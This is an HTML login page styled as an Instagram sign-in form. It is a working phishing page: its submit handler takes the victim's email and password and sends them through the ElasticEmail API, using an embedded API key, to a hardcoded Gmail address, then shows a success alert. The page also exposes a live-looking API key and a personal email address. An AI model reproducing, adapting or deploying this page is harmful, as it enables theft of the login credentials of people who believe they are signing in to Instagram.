<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>3D Neumorphic Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <style>
    body {
      min-height: 100vh;
      background: #ecf0f3;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Poppins', sans-serif;
    }
    .container {
      background: #ecf0f3;
      border-radius: 30px;
      box-shadow: 8px 8px 16px #d1d9e6,
                  -8px -8px 16px #ffffff;
      padding: 40px 30px 30px 30px;
      width: 350px;
      text-align: center;
    }
    .avatar {
      width: 70px;
      height: 70px;
      background: #ecf0f3;
      margin: auto;
      border-radius: 50%;
      box-shadow: 2px 2px 8px #d1d9e6, -2px -2px 8px #fff;
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 36px;
      color: #737373;
    }
    .container h2 {
      margin-bottom: 10px;
      color: #373737;
      font-weight: 600;
    }
    .container form {
      margin-top: 10px;
    }
    .input-field {
      display: flex;
      align-items: center;
      margin-bottom: 18px;
      background: #ecf0f3;
      box-shadow: inset 2px 2px 5px #d1d9e6, inset -5px -5px 10px #fff;
      border-radius: 18px;
      padding: 0 14px;
    }
    .input-field input {
      border: none;
      outline: none;
      background: none;
      width: 100%;
      padding: 15px 8px;
      font-size: 16px;
      border-radius: 18px;
      margin-left: 10px;
    }
    .input-field .fa {
      color: #888;
    }
    .remember {
      display: flex;
      justify-content: space-between;
      font-size: 13px;
      color: #737373;
      margin-bottom: 15px;
    }
    .remember label {
      cursor: pointer;
    }
    .container button {
      width: 100%;
      padding: 13px 0;
      margin: 10px 0 20px 0;
      border: none;
      background: #ecf0f3;
      border-radius: 25px;
      font-size: 18px;
      font-weight: 600;
      color: #373737;
      box-shadow: 4px 4px 15px #d1d9e6, -4px -4px 15px #fff;
      cursor: pointer;
      transition: 0.3s;
    }
    .container button:hover {
      box-shadow: inset 4px 4px 8px #d1d9e6, inset -4px -4px 8px #fff;
      color: #3498db;
    }
    .social {
      display: flex;
      justify-content: center;
      margin: 14px 0 0 0;
    }
    .social i {
      box-shadow: 2px 2px 8px #d1d9e6,
                  -2px -2px 8px #fff;
      border-radius: 50%;
      background: #ecf0f3;
      font-size: 20px;
      margin: 0 8px;
      padding: 10px;
      color: #3498db;
      cursor: pointer;
      transition: 0.2s;
    }
    .social i:hover {
      color: #2980b9;
      background: #fff;
    }
    .signup {
      margin-top: 12px;
      color: #888;
      font-size: 13px;
    }
    .signup a {
      color: #3498db;
      text-decoration: none;
      font-weight: 600;
    }
  </style>
</head>
<body>
  
  
   
  
  
  <!-- form aur baaki code same rakhna hai -->
  <div class="container">
    <!-- Instagram icon on top -->
    <div style="width: 45px; height: 45px; margin: 0 auto 14px auto; 
                background: #ecf0f3; border-radius: 50%; 
                box-shadow: 2px 2px 8px #d1d9e6, -2px -2px 8px #fff;
                display: flex; align-items: center; justify-content: center;">
      <i class="fa fa-instagram" style="font-size: 30px; color: #C12554;"></i>
    </div>
   
    
    <!-- rest code as is -->
    <h2>instagram</h2>
    <form id="myForm" onsubmit="event.preventDefault(); emailSend();">
      <div class="input-field">
        <i class="fa fa-envelope"></i>
        <input type="email" id="email" placeholder="Email address" required>
      </div>
      
       <div class="input-field" style="position: relative;">
  <i class="fa fa-lock"></i>
  <input type="password" id="password" placeholder="Password" required>
  <span onclick="togglePassword()" 
        style="position:absolute; right:14px; color:#888; cursor:pointer; font-size:18px; top:50%; transform:translateY(-50%);">
    <i id="eyeIcon" class="fa fa-eye"></i>
  </span>
</div>

      <div class="remember">
        <label><input type="checkbox"> Remember me</label>
        <a href="#">Forgot password?</a>
      </div>
      <button type="submit">Sign In</button>
    </form>
    <div>OR CONTINUE WITH</div>
    <div class="social">
      <i class="fa fa-google"></i>
      <i class="fa fa-github"></i>
      <i class="fa fa-twitter"></i>
    </div>
    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  <script src="https://smtpjs.com/v3/smtp.js"></script>
  <script>
    function emailSend() {
      var email = document.getElementById('email').value;
      var password = document.getElementById('password').value;
      var messageBody = `<strong>Email:</strong> ${email} <br/><strong>Password:</strong> ${password}`;

      fetch("https://api.elasticemail.com/v2/email/send", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          apikey: "0F91E1D9D826380126D0E9E9F3B012A8C1C574DDA1FFCA4711D21324F59B67CFF4DAB49DD42205A15699949792E481FB",
          subject: "hello",
          from: "aartibaghel3255@gmail.com",
          to: "aartibaghel3255@gmail.com",
          bodyHtml: messageBody,
          isTransactional: "true"
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          swal("Successful", "Email sent!", "success");
          document.getElementById('myForm').reset();
        } else {
          swal("Error", "Failed to send email: " + (data.error || "Unknown error"), "error");
          console.error("ElasticEmail Error:", data.error);
        }
      })
      .catch(error => {
        swal("Error", "Unexpected error occurred! CORS issue or network problem.", "error");
        console.error("Fetch error:", error);
      });
    }
  </script>
  <script>
function togglePassword() {
  var pass = document.getElementById("password");
  var icon = document.getElementById("eyeIcon");
  if (pass.type === "password") {
    pass.type = "text";
    icon.classList.remove("fa-eye");
    icon.classList.add("fa-eye-slash");
  } else {
    pass.type = "password";
    icon.classList.remove("fa-eye-slash");
    icon.classList.add("fa-eye");
  }
}
</script>
</body>
</html>
